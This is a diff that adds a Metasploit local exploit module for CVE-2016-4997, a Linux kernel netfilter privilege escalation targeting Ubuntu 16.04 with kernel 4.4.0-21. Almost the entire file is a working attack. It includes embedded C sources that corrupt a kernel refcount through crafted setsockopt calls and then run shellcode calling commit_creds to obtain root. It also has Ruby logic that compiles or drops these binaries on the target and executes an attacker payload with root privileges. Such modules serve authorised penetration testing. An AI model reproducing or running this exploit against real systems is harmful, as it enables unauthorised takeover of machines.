@@ -1,0 +1,431 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require "msf/core"
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GoodRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+        'Name'           => 'Linux Kernel 4.6.3 Netfilter Privilege Escalation',
+        'Description'    => %q{
+          This module attempts to exploit a netfilter bug on Linux Kernels befoe 4.6.3, and currently
+          only works against Ubuntu 16.04 (not 16.04.1) with kernel
+          4.4.0-21-generic.
+          Several conditions have to be met for successful exploitation:
+          Ubuntu:
+          1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such)
+          2. libc6-dev-i386 (ubuntu), glibc-devel.i686  & libgcc.i686 (fedora) needs to be installed to compile
+          Kernel 4.4.0-31-generic and newer are not vulnerable.
+
+          We write the ascii files and compile on target instead of locally since metasm bombs for not
+          having cdefs.h (even if locally installed)
+        },
+        'License'        => MSF_LICENSE,
+        'Author'         =>
+          [
+            'h00die <mike@stcyrsecurity.com>',  # Module
+            'vnik'                         # Discovery
+          ],
+        'DisclosureDate' => 'Jun 03 2016',
+        'Platform'       => [ 'linux'],
+        'Arch'           => [ ARCH_X86 ],
+        'SessionTypes'   => [ 'shell', 'meterpreter' ],
+        'Targets'        =>
+          [
+            [ 'Ubuntu', { } ]
+            #[ 'Fedora', { } ]
+          ],
+        'DefaultTarget'  => 0,
+        'References'     =>
+          [
+            [ 'EDB', '40049'],
+            [ 'CVE', '2016-4997'],
+            [ 'URL', 'http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c']
+          ]
+      ))
+    register_options(
+      [
+        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),
+        OptInt.new('MAXWAIT', [ true, 'Max seconds to wait for decrementation in seconds', 180 ]),
+        OptBool.new('REEXPLOIT', [ true, 'desc already ran, no need to re-run, skip to running pwn',false]),
+        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])
+      ], self.class)
+  end
+
+  def check
+    def iptables_loaded?()
+      # user@ubuntu:~$ cat /proc/modules | grep ip_tables
+      # ip_tables 28672 1 iptable_filter, Live 0x0000000000000000
+      # x_tables 36864 2 iptable_filter,ip_tables, Live 0x0000000000000000
+      vprint_status('Checking if ip_tables is loaded in kernel')
+      if target.name == "Ubuntu"
+        iptables = cmd_exec('cat /proc/modules | grep ip_tables')
+        if iptables.include?('ip_tables')
+          vprint_good('ip_tables.ko is loaded')
+        else
+          print_error('ip_tables.ko is not loaded.  root needs to run iptables -L or similar command')
+        end
+        return iptables.include?('ip_tables')
+      elsif target.name == "Fedora"
+        iptables = cmd_exec('cat /proc/modules | grep iptable_raw')
+        if iptables.include?('iptable_raw')
+          vprint_good('iptable_raw is loaded')
+        else
+          print_error('iptable_raw is not loaded.  root needs to run iptables -L or similar command')
+        end
+        return iptables.include?('iptable_raw')
+      else
+        return false
+      end
+    end
+
+    def shemsham_installed?()
+      # we want this to be false.
+      vprint_status('Checking if shem or sham are installed')
+      shemsham = cmd_exec('cat /proc/cpuinfo')
+      if shemsham.include?('shem')
+        print_error('shem installed, system not vulnerable.')
+      elsif shemsham.include?('sham')
+        print_error('sham installed, system not vulnerable.')
+      else
+        vprint_good('shem and sham not present.')
+      end
+      return (shemsham.include?('shem') or shemsham.include?('sham'))
+    end
+
+    if iptables_loaded?() and not shemsham_installed?()
+      return CheckCode::Appears
+    else
+      return CheckCode::Safe
+    end
+  end
+
+  def exploit
+    # first thing we need to do is determine our method of exploitation: compiling realtime, or droping a pre-compiled version.
+    def has_prereqs?()
+      vprint_status('Checking if 32bit C libraries, gcc-multilib, and gcc are installed')
+      if target.name == "Ubuntu"
+        lib = cmd_exec('dpkg --get-selections | grep libc6-dev-i386')
+        if lib.include?('install')
+          vprint_good('libc6-dev-i386 is installed')
+        else
+          print_error('libc6-dev-i386 is not installed.  Compiling will fail.')
+        end
+        multilib = cmd_exec('dpkg --get-selections | grep ^gcc-multilib')
+        if multilib.include?('install')
+          vprint_good('gcc-multilib is installed')
+        else
+          print_error('gcc-multilib is not installed.  Compiling will fail.')
+        end
+        gcc = cmd_exec('which gcc')
+        if gcc.include?('gcc')
+          vprint_good('gcc is installed')
+        else
+          print_error('gcc is not installed.  Compiling will fail.')
+        end
+        return gcc.include?('gcc') && lib.include?('install') && multilib.include?('install')
+      elsif target.name == "Fedora"
+        lib = cmd_exec('dnf list installed | grep -E \'(glibc-devel.i686|libgcc.i686)\'')
+        if lib.include?('glibc')
+          vprint_good('glibc-devel.i686 is installed')
+        else
+          print_error('glibc-devel.i686 is not installed.  Compiling will fail.')
+        end
+        if lib.include?('libgcc')
+          vprint_good('libgcc.i686 is installed')
+        else
+          print_error('libgcc.i686 is not installed.  Compiling will fail.')
+        end
+        multilib = false #not implemented
+        gcc = false #not implemented
+        return (lib.include?('glibc') && lib.include?('libgcc')) && gcc && multilib
+      else
+        return false
+      end
+    end
+
+    compile = false
+    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'
+      if has_prereqs?()
+        compile = true
+        vprint_status('Live compiling exploit on system')
+      else
+        vprint_status('Dropping pre-compiled exploit on system')
+      end
+    end
+    if check != CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
+    end
+
+    desc_file = datastore["WritableDir"] + "/" + rand_text_alphanumeric(8)
+    env_ready_file = datastore["WritableDir"] + "/" + rand_text_alphanumeric(8)
+    pwn_file = datastore["WritableDir"] + "/" + rand_text_alphanumeric(8)
+    payload_file = rand_text_alpha(8)
+    payload_path = "#{datastore["WritableDir"]}/#{payload_file}"
+
+    # direct copy of code from exploit-db, except removed the check for shem/sham and ip_tables.ko since we can do that in the check area here
+    # removed         #include <netinet/in.h> per busterb comment in PR 7326
+    decr = %q{
+      #define _GNU_SOURCE
+      #include <stdio.h>
+      #include <stdlib.h>
+      #include <string.h>
+      #include <unistd.h>
+      #include <sched.h>
+      #include <netinet/in.h>
+      #include <linux/sched.h>
+      #include <errno.h>
+      #include <sys/types.h>
+      #include <sys/socket.h>
+      #include <sys/ptrace.h>
+      #include <net/if.h>
+      #include <linux/netfilter_ipv4/ip_tables.h>
+      #include <linux/netlink.h>
+      #include <fcntl.h>
+      #include <sys/mman.h>
+
+      #define MALLOC_SIZE 66*1024
+
+      int decr(void *p) {
+          int sock, optlen;
+          int ret;
+          void *data;
+          struct ipt_replace *repl;
+          struct ipt_entry *entry;
+          struct xt_entry_match *ematch;
+          struct xt_standard_target *target;
+          unsigned i;
+
+          sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
+
+          if (sock == -1) {
+                  perror("socket");
+                  return -1;
+          }
+
+          data = malloc(MALLOC_SIZE);
+
+          if (data == NULL) {
+              perror("malloc");
+              return -1;
+          }
+
+          memset(data, 0, MALLOC_SIZE);
+
+          repl = (struct ipt_replace *) data;
+          repl->num_entries = 1;
+          repl->num_counters = 1;
+          repl->size = sizeof(*repl) + sizeof(*target) + 0xffff;
+          repl->valid_hooks = 0;
+
+          entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));
+          entry->target_offset = 74; // overwrite target_offset
+          entry->next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);
+
+          ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));
+
+          strcpy(ematch->u.user.name, "icmp");
+          void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);
+          uint64_t *me = (uint64_t *)(kmatch + 0x58);
+          *me = 0xffffffff821de10d; // magic number!
+
+          uint32_t *match = (uint32_t *)((char *)&ematch->u.kernel.match + 4);
+          *match = (uint32_t)kmatch;
+
+          ematch->u.match_size = (short)0xffff;
+
+          target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);
+          uint32_t *t = (uint32_t *)target;
+          *t = (uint32_t)kmatch;
+
+          printf("[!] Decrementing the refcount. This may take a while...\n");
+          printf("[!] Wait for the \"Done\" message (even if you'll get the prompt back).\n");
+
+          for (i = 0; i < 0xffffff/2+1; i++) {
+              ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);
+          }
+
+          close(sock);
+          free(data);
+          printf("[+] Done! Now run ./pwn\n");
+
+          return 0;
+      }
+
+      int main(void) {
+          void *stack;
+          int ret;
+
+          printf("netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\n");
+
+          ret = unshare(CLONE_NEWUSER);
+
+          if (ret == -1) {
+              perror("unshare");
+              return -1;
+          }
+
+          stack = (void *) malloc(65536);
+
+          if (stack == NULL) {
+              perror("malloc");
+              return -1;
+          }
+
+          clone(decr, stack + 65536, CLONE_NEWNET, NULL);
+
+          sleep(1);
+
+          return 0;
+      }
+    }
+
+    # direct copy of code from exploit-db
+    pwn = %q{
+      #include <stdio.h>
+      #include <string.h>
+      #include <errno.h>
+      #include <unistd.h>
+      #include <stdint.h>
+      #include <fcntl.h>
+      #include <sys/mman.h>
+      #include <assert.h>
+
+      #define MMAP_ADDR 0xff814e3000
+      #define MMAP_OFFSET 0xb0
+
+      typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);
+      typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);
+
+      void __attribute__((regparm(3))) privesc() {
+          commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;
+          prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;
+          commit_creds(prepare_kernel_cred((uint64_t)NULL));
+      }
+
+      int main() {
+          void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);
+          assert(payload == (void *)MMAP_ADDR);
+
+          void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);
+
+          memset(shellcode, 0, 0x300000);
+
+          void *ret = memcpy(shellcode, &privesc, 0x300);
+          assert(ret == shellcode);
+
+          printf("[+] Escalating privs...\n");
+
+          int fd = open("/dev/ptmx", O_RDWR);
+          close(fd);
+
+          assert(!getuid());
+
+          printf("[+] We've got root!");
+
+          return execl("/bin/bash", "-sh", NULL);
+      }
+    }
+
+    # the original code printed a line.  However, this is hard to detect due to threading.
+    # so instead we can write a file in /tmp to catch.
+    decr.gsub!(/printf\("\[\+\] Done\! Now run \.\/pwn\\n"\);/,
+               "int fd2 = open(\"#{env_ready_file}\", O_RDWR|O_CREAT, 0777);close(fd2);" )
+
+    # patch in to run our payload
+    pwn.gsub!(/execl\("\/bin\/bash", "-sh", NULL\);/,
+               "execl(\"#{payload_path}\", NULL);")
+
+    def pwn(payload_path, pwn_file, pwn, compile)
+      # lets write our payload since everythings set for priv esc
+      vprint_status("Writing payload to #{payload_path}")
+      write_file(payload_path, generate_payload_exe)
+      cmd_exec("chmod 555 #{payload_path}")
+      register_file_for_cleanup(payload_path)
+
+      # now lets drop part 2, and finish up.
+      rm_f pwn_file
+      if compile
+        print_status "Writing pwn executable to #{pwn_file}.c"
+        rm_f "#{pwn_file}.c"
+        write_file("#{pwn_file}.c", pwn)
+        cmd_exec("gcc #{pwn_file}.c -O2 -o #{pwn_file}")
+        register_file_for_cleanup("#{pwn_file}.c")
+      else
+        print_status "Writing pwn executable to #{pwn_file}"
+        write_file(pwn_file, pwn)
+      end
+      register_file_for_cleanup(pwn_file)
+      cmd_exec("chmod +x #{pwn_file}; #{pwn_file}")
+    end
+
+    if not compile # we need to override with our pre-created binary
+      # pwn file
+      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-pwn.out')
+      fd = ::File.open( path, "rb")
+      pwn = fd.read(fd.stat.size)
+      fd.close
+      # desc file
+      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-decr.out')
+      fd = ::File.open( path, "rb")
+      decr = fd.read(fd.stat.size)
+      fd.close
+
+      # overwrite the hardcoded variable names in the compiled versions
+      env_ready_file = '/tmp/okDjTFSS'
+      payload_path = '/tmp/2016_4997_payload'
+    end
+
+    # check for shortcut
+    if datastore['REEXPLOIT']
+      pwn(payload_path, pwn_file, pwn, compile)
+    else
+      rm_f desc_file
+      if compile
+        print_status "Writing desc executable to #{desc_file}.c"
+        rm_f "#{desc_file}.c"
+        write_file("#{desc_file}.c", decr)
+        register_file_for_cleanup("#{desc_file}.c")
+        output = cmd_exec("gcc #{desc_file}.c -m32 -O2 -o #{desc_file}")
+      else
+        write_file(desc_file, decr)
+      end
+      rm_f env_ready_file
+      register_file_for_cleanup(env_ready_file)
+      #register_file_for_cleanup(desc_file)
+      if not file_exist?(desc_file)
+        vprint_error("gcc failure output: #{output}")
+        fail_with(Failure::Unknown, "#{desc_file}.c failed to compile")
+      end
+      if target.name == "Ubuntu"
+        vprint_status "Executing #{desc_file}, may take around 35s to finish.  Watching for #{env_ready_file} to be created."
+      elsif target.name == "Fedora"
+        vprint_status "Executing #{desc_file}, may take around 80s to finish.  Watching for #{env_ready_file} to be created."
+      end
+      cmd_exec("chmod +x #{desc_file}; #{desc_file}")
+      sec_waited = 0
+
+      until sec_waited > datastore['MAXWAIT'] do
+        Rex.sleep(1)
+        if sec_waited % 10 == 0
+          vprint_status("Waited #{sec_waited}s so far")
+        end
+
+        if file_exist?(env_ready_file)
+          print_good("desc finished, env ready.")
+          pwn(payload_path, pwn_file, pwn, compile)
+          return
+        end
+        sec_waited +=1
+      end
+    end
+  end
+end
